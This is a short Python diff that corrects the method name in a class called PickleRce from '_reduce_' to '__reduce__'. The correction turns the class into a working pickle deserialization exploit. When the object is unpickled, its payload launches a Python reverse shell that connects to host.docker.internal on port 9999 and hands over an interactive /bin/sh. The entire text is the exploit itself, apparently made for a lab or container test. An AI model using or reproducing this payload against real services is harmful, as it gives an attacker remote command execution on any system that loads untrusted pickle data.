@@ -1,7 +1,7 @@
 import pickle
 
 class PickleRce(object):
-    def _reduce_(self):
+    def __reduce__(self):
         import subprocess
         return (subprocess.Popen, (('/bin/sh','-c','python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"host.docker.internal\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\''),0))
 
